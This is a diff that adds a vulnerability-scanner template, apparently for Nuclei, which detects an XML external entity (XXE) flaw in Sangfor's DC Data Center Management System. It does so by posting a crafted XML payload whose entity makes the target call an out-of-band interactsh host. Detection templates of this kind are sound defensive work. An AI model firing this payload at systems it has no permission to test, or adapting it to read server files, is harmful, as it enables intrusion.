@@ -1,0 +1,30 @@
+id: poc-sangfor-dc-xxe
+
+info:
+  name: Sangfor DC Data Center Management System XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dnslog
+
+http:
+  - method: POST
+    path:
+      - "/src/sangforindex"
+    headers:
+      Content-Type: text/xml
+    body: |
+      <?xml version="1.0" encoding="utf-8" ?>
+      <!DOCTYPE root [
+          <!ENTITY rootas SYSTEM "http://{{interactsh-url}}">
+      ]>
+      <xxx>&rootas;</xxx>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
